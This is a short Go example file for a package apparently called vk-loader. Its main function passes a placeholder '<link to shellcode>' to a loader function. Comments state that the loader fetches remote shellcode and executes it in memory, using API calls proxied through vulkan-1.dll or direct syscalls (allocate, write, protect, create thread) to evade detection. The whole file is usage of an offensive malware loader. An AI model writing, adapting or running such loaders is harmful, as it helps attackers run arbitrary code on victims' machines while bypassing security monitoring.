package main

import (
	"github.com/carved4/vk-loader/pkg/vulkan"
)

func main() {
	// mscoree.dll!GetProcessExecutableHeap
	// kernel32.dll!HeapAlloc
	// ntdll.dll!LdrCallEnclave
	// all made through a randomly selected proxy function from vulkan-1.dll
	vulkan.Vulkan2("<link to shellcode>")
	// or
	vulkan.Vulkan1("<link to shellcode>")
	// this will make direct syscalls with the same vulkan proxy method
	// ntalloc, ntwrite, ntprotect, ntcreatethread, ntwaitforsingleobject pattern

}
